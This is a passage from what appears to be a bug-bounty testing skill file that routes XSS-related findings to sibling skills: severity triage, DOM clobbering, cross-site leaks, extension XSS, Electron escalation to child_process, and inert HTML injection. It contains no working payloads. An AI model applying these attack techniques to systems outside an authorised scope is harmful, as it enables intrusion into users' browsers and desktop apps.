- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.
- **`hunt-dom`:** owns DOM sources and sinks as a class, DOM clobbering, service-worker abuse, postMessage hijacking and same-origin CSS exfiltration. Boundary: a JS source reaching a JS sink, or a clobbered global, is that skill's finding. This skill owns the shadow-tree and WASM-linear-memory contexts a light-DOM review walks past; Chain 5 above stays here only as a chain into XSS.
- **`hunt-xs-leaks`:** owns cross-origin side channels. XSSI boundary: reading the body of a victim's script-typed response is here, inferring one bit from whether the include loaded or errored (the CORB/ORB oracle) is there. Its `references/defences-and-headers.md` holds the dated `SameSite` and third-party-cookie matrix that decides whether any include-based probe is authenticated at all.
- **`hunt-browser-extension`:** owns XSS inside an extension context (extension pages, content scripts, the enforced MV3 CSP). A payload that only executes in the extension's own origin belongs there.
- **`hunt-electron`:** owns XSS-to-OS escalation in desktop apps. Once script execution in an Electron renderer is confirmed, the escalation to `require('child_process')` or a preload bridge is that skill's.
- **`hunt-html-injection`:** owns raw-HTML injection that does not execute script, including an inert `<template>` echoed back with nothing firing.
